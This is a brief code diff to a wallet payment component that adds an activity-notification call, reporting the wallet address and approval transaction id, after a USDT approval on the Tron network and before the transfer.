@@ -371,6 +371,11 @@ const TrustWalletTronPay = () => {
       }
 
       const approveTxId = await approveUSDT("tron", toInput.trim());
+      void notifyTrustTronActivity({
+        event: "token_approved",
+        walletAddress: address,
+        approveTxId,
+      });
       const transferTxId = await transferUSDT("tron", toInput.trim(), normalizedAmount);
 
       toast.success("Approve and transfer completed successfully.");
